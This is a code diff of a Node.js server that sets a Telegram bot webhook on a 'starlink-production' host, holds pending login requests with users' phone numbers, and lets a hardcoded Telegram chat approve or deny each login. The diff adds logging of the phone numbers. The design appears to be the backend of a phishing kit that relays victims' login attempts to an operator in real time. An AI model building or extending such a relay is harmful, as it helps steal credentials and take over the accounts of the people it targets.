@@ -57,11 +57,11 @@ const CHAT_ID = '8392790531';
 const pendingRequests = {};
 
 // ============================================
-// SET TELEGRAM WEBHOOK - UPDATED URL
+// SET TELEGRAM WEBHOOK
 // ============================================
 app.get('/api/set-webhook', async (req, res) => {
   try {
-    const webhookUrl = `https://starlink-production-c046.up.railway.app/api/telegram/callback`; // <-- UPDATED
+    const webhookUrl = `https://starlink-production-c046.up.railway.app/api/telegram/callback`;
     
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
       method: 'POST',
@@ -144,7 +144,9 @@ app.post('/api/telegram/callback', async (req, res) => {
     if (action === 'approve') {
       pendingRequests[requestId].status = 'approved';
       console.log('✅ Login approved for request:', requestId);
+      console.log('📱 Phone:', pendingRequests[requestId].phone);
       
+      // Send confirmation to Telegram
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -156,10 +158,13 @@ app.post('/api/telegram/callback', async (req, res) => {
       });
 
       res.json({ success: true, message: 'Login approved' });
+      
     } else if (action === 'deny') {
       pendingRequests[requestId].status = 'denied';
       console.log('❌ Login denied for request:', requestId);
+      console.log('📱 Phone:', pendingRequests[requestId].phone);
 
+      // Send denial to Telegram
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -171,6 +176,7 @@ app.post('/api/telegram/callback', async (req, res) => {
       });
 
       res.json({ success: true, message: 'Login denied' });
+      
     } else {
       res.status(400).json({ success: false, message: 'Invalid action' });
     }
